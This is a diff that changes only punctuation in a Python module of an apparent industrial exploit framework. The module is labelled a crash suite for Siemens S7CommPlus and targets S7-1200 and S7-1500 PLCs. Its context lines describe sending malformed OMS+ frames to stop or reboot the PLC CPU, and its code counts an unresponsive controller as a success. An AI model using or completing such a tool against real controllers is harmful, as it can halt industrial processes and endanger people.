@@ -1,4 +1,4 @@
-"""IndustrialXPL Protocol Module — Siemens S7CommPlus Crash Suite.
+"""IndustrialXPL Protocol Module - Siemens S7CommPlus Crash Suite.
 
 5 vulnerabilities in the OMS+ component of Siemens S7CommPlus (protocol 0x72)
 that crash Siemens S7-1200 and S7-1500 PLCs even with secure communication
@@ -107,7 +107,7 @@ class Exploit(Exploit):
                     f"  4. Send malformed OMS+ frame (variant {self.variant})\n"
                     "  5. PLC CPU stops or reboots\n\n"
                     "NOTE: Siemens issued advisory SSA with patches.\n"
-                    "Destructive mode causes PLC STOP — production impact!"
+                    "Destructive mode causes PLC STOP - production impact!"
                 ),
                 mitre_techniques=["T0814", "T0816"],
             )
@@ -147,13 +147,13 @@ class Exploit(Exploit):
                     resp = s.recv(32)
                     s.close()
                     if not resp:
-                        print_success(f"[S7Plus-Crash v{v}] No response — PLC may have crashed!")
+                        print_success(f"[S7Plus-Crash v{v}] No response - PLC may have crashed!")
                     else:
                         print_info(f"[S7Plus-Crash v{v}] Response {len(resp)}B: {resp[:16].hex()}")
                 except ConnectionResetError:
-                    print_success(f"[S7Plus-Crash v{v}] Connection reset — CPU fault triggered!")
+                    print_success(f"[S7Plus-Crash v{v}] Connection reset - CPU fault triggered!")
                 except TimeoutError:
-                    print_success(f"[S7Plus-Crash v{v}] Timeout — PLC unresponsive!")
+                    print_success(f"[S7Plus-Crash v{v}] Timeout - PLC unresponsive!")
 
             except Exception as e:
                 print_error(f"[S7Plus-Crash v{v}] {e}")
